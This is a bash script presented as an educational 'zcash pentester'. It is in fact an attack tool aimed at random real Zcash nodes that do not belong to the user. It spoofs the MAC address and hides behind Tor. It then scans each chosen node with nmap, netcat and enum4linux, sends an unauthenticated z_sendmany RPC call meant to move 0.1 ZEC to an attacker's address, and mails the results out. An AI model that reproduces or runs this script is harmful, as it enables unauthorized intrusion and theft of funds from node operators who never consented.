#!/bin/bash

echo "Starting zcash pentester (for educational purposes). Do not forget to run this script as root!"


#macchange blocks here
echo "Mac Address Change in Progress"
ifconfig WIFI_INTERFACE down
macchanger -r WIFI_INTERFACE
ifconfig WIFI_INTERFACE up
echo "Mac Address Change Done!"
sleep 10


while :
do
	date && echo "Gathering an ip over the pool"
	#generic request of a zcash full-node ip && check its fraud score.
	ZCASH_IP=`curl -s https://api.blockchair.com/zcash/nodes | grep -oP '([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})' | shuf -n 1` && FRAUD_SCORE=`curl -s https://www.ipqualityscore.com/api/json/ip/FREE_API_KEY/{$ZCASH_IP} | jq '.fraud_score'`

	echo "Gathered $ZCASH_IP with a fraud score $FRAUD_SCORE"

	if [ $FRAUD_SCORE -lt 75 ]; then
		echo -e "\a"
		echo "Entering TOR tunnel now!"
		anonsurf start
		sleep 10
		echo "Fraud Limit is in bounds. Starting Information Gathering & Sending Notifiers"
		NMAP_RESOLUTION=$(sudo nmap -sS --mtu 8 $ZCASH_IP -Pn --reason -F)
		sleep 1
		WHOIS_RECORD=$(whois $ZCASH_IP)
		sleep 1
		NETCAT_PREP=$(echo $NMAP_RESOLUTION | grep -oP '^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])' | tr '\n' ' ')
		NETCAT_RESULT=$(nc -zvn $ZCASH_IP $NETCAT_PREP) 
		sleep 1
		ENUM_4_LINUX=$(enum4linux -U -o $ZCASH_IP)
		sleep 1
		CURL_RESULT=$(curl --data-binary '{"jsonrpc": "1.0", "id":"pwned", "method": "z_sendmany", "params": ["ANY_TADDR", [{"address": "TESTING_RECEIVER_ADDR", "amount": 0.1}]] }' -H 'content-type: text/plain;' http://$ZCASH_IP:8232/)
		sleep 1
		echo "$NMAP_RESOLUTION $WHOIS_RECORD $NETCAT_RESULT $ENUM_4_LINUX $CURL_RESULT" > $ZCASH_IP
		sendmail MAIL@HOST < $ZCASH_IP
		echo "mail sent!"
		anonsurf stop
		echo "Exited TOR tunnel now!"
		sleep 10
	else
		echo "Fraud Limit is out of bounds. Will retry in 10 minutes!"
	fi
	
	sleep 600
done
